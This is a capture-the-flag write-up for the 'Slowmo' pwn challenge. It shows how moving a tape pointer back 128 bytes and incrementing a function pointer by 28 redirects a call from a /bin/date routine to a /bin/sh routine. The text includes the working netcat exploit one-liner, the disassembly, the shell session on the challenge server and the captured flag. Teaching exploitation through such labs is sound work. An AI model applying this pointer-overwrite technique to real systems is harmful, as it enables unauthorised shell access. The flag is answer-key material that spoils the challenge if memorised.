# Slowmo
Pwn - 444 points

## Challenge 

>What is in this mysterious package?

>nc ctf.pwn.sg 4005

> Creator - amon (@nn_amon)

> [slowmo](slowmo) [slowmo.c](slowmo.c)

## Solution

*Originally, the challenge was released without the source code, but it was provided later on in the competition. Only then could I solve it...*

#### Looking at the source...

- There are 2 functions `dis()` and `dos()`.

- A function pointed to by `indirection` can be called, which is originally `dis()`.

- We want to call `dos()` to get a shell.

- There is a char buffer `tape` directly after `indirection`.


Main Function:

- There is a pointer `ptr` which we can manipulate through user input.

- Enter `<` and `>` to increment/decrement the pointer address

- Enter `^` and `v` to increment/decrement the value present at the pointer address.

- Enter `` ` `` to read the memory

- Enter `!` to call `indirection`

#### Crafting Payload

We know that `ptr` is originally `tape + 128`. 

Hence, if we move back 128 times, we will be able to modify the function pointer `indirection`.

We can verify this...


	$ python -c 'print (">\n"*(128) + "^\n" + "`\n" + "!\n") ' | ./slowmo 

	/01/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/00/

Now, we need to find the difference in address between `dis()` and `dos()`.

I viewed the binary in Hopper decompiler, and checked the address.
	
	sub_105b4:
		000105b4         push       {fp, lr}                                            ; DATA XREF=sub_105ec+28, 0x10778
		000105b8         add        fp, sp, #0x4
		000105bc         ldr        r0, aBindate                                        ; argument #1 for method sub_17428, 0x105cc,"/bin/date"
		000105c0         bl         sub_17428                                           ; sub_17428
		000105c4         mov        r0, r0
		000105c8         pop        {fp, pc}
		                        ; endp
		000105cc         dd         0x00071e9c                                          ; "/bin/date", DATA XREF=sub_105b4+8


	sub_105d0:
		000105d0         push       {fp, lr}
		000105d4         add        fp, sp, #0x4
		000105d8         ldr        r0, aBinsh_71ea8                                    ; argument #1 for method sub_17428, 0x105e8,"/bin/sh"
		000105dc         bl         sub_17428                                           ; sub_17428
		000105e0         mov        r0, r0
		000105e4         pop        {fp, pc}
		                        ; endp
		000105e8         dd         0x00071ea8                                          ; "/bin/sh", DATA XREF=sub_105d0+8

From this, we can see that `dos()` is ahead of `dis()` by 28 in decimal.

	>>> 0x000105d0 - 0x000105b4
	28

Thus, the final payload is this
	
	$ (python -c 'print ("<\n"*(128) + "^\n"*28 + "!\n") '; cat) | nc ctf.pwn.sg 4005
	ls
		bin
		boot
		dev
		etc
		home
		lib
		lib64
		media
		mnt
		opt
		proc
		root
		run
		sbin
		srv
		sys
		tmp
		usr
		var
	ls -la
		total 72
		drwxr-xr-x  58 root root 4096 Jun 17 02:03 .
		drwxr-xr-x  58 root root 4096 Jun 17 02:03 ..
		-rwxr-xr-x   1 root root    0 Jun 17 01:14 .dockerenv
		drwxr-xr-x   2 root root 4096 Jun 16 04:41 bin
		drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
		drwxr-xr-x   5 root root  360 Jun 17 01:14 dev
		drwxr-xr-x  88 root root 4096 Jun 17 01:14 etc
		drwxr-xr-x  10 root root 4096 Jun 16 04:41 home
		drwxr-xr-x  12 root root 4096 Jun 16 04:41 lib
		drwxr-xr-x   2 root root 4096 May 25 17:45 lib64
		drwxr-xr-x   2 root root 4096 May 25 17:45 media
		drwxr-xr-x   2 root root 4096 May 25 17:45 mnt
		drwxr-xr-x   2 root root 4096 May 25 17:45 opt
		dr-xr-xr-x 260 root root    0 Jun 17 01:14 proc
		drwx------   2 root root 4096 Jun 17 02:03 root
		drwxr-xr-x   6 root root 4096 Jun 16 04:41 run
		drwxr-xr-x   2 root root 4096 Jun 16 04:41 sbin
		drwxr-xr-x   2 root root 4096 May 25 17:45 srv
		dr-xr-xr-x  13 root root    0 Jun 15 21:46 sys
		drwxrwxrwt   2 root root 4096 Jun 18 09:11 tmp
		drwxr-xr-x  16 root root 4096 Jun 16 04:41 usr
		drwxr-xr-x  19 root root 4096 Jun 16 04:41 var
	cd home
	ls
		slowmo
	cd slowmo
	ls
		flag
		run.sh
		slowmo
	cat flag
		CrossCTF{l1sten_cl0s3_and_d0nt_b33_st00nes}


## Flag

	CrossCTF{l1sten_cl0s3_and_d0nt_b33_st00nes}
